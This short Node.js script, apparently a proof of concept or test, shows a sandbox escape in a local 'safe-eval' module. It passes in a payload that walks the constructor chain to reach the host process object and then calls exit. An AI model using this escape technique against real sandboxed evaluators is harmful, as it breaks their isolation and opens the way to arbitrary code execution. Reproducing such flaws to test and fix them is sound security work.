var safeEval = require('./index.js');
safeEval("this.constructor.constructor('return process')().exit()");
process.stdin.resume();
